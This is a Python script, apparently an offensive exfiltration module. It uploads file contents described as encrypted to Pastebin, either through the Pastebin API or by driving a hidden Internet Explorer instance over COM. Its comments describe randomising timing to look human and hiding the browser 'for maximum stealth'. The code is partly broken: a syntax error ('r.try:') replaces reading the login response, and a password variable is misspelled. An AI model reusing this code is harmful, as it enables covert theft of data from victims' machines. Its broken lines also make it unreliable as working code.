from win32com import client

import os
import random
import requests
import time 


username = 'tim' # Pastebin username
password = 'seKret' # Pastebin password
api_dev_key = 'cd3xxx001xxxx02' # Pastbin api key.

def plain_paste(title, contents): # Receives the filename as title, and encrypted contents as content arguments.
    login_url = 'https://pastebin.com/api/api_login.php'
    login_data = { # Login request contents.
        'api_dev_key': api_dev_key,
        'api_user_name': username,
        'api_user_password': password,
    }
    r = requests.post(login_url, data=login_data)
    api_user_key = r.try: # This login data we name api_user_key.

    paste_url = 'https://pastebin.com/api/api_post.php'
    paste_data = { # Structure of the post request including the login info, api_dev_key, and content to decode and post. 
        'api_paste_name': title,
        'api_paste_code': contents.decode(),
        'api_dev_key': api_dev_key,
        'api_user_key': api_user_key,
        'api_option': 'paste',
        'api_paste_private': 0,
    }
    r = requests.post(paste_url, data=paste_data) # The full request with the paste_url and paste_data.
    print(r.status_code)
    print(r.text)

# Windows Specific:

def wait_for_browser(browser): # Ensure browser has finished its events.
    while browser.ReadyState != 4 and browser.ReadyState != 'complete':
        time.sleep(0.1)

def random_sleep(): # Randomize browser behavior to make it look more human.
    time.sleep(random.randint(5,10))

def login(ie):
    full_doc = ie.Document.all # Retrieve all elements from the DOM (Document Object Model).
    for elem in full_doc: # Looks for username and password fields and sets them to the creds we provided.
        if elem.id == 'loginform-username':
            elem.setAttribute('value', username)
        elif elem.id == 'loginform-password':
            elem.setAttribute('value', passowrd)

    random_sleep()
    if ie.Document.forms[0].id == 'w0':
        ie.document.forms[0].submit()
    wait_for_browser(ie)

def submit(ie, title, contents):
    full_doc = ie.Document.all
    for elem in full_doc:
        if elem.id == 'postform-name':
            elem.setAttribute('value', title)
        elif elem.id == 'postform-text':
            elem.setAttribute('value', contents)

    if ie.Document.forms[0].id == 'w0':
        ie.document.forms[0].submit()
    random_sleep()
    wait_for_browser(ie)

def ie_paste(title, contents):
    ie = client.Dispatch('InternetExplorer.Application') # Creates new instance of the IE COM object.
    ie.Visible = 1 # set process to be visible or not, for debugging. Set to 0 for maximum stealth.

    ie.Navigate('https://pastebin.com/login')
    wait_for_browser(ie)
    login(ie)

    ie.Navigate('https://pastebin.com')
    wait_for_browser(ie)
    submit(ie, title, contents.decode())

    ie.Quit() # After calling all of our helper functions, we kill the IE instance.

if __name__ == '__main__':
    ie_paste('title', 'contents')
    
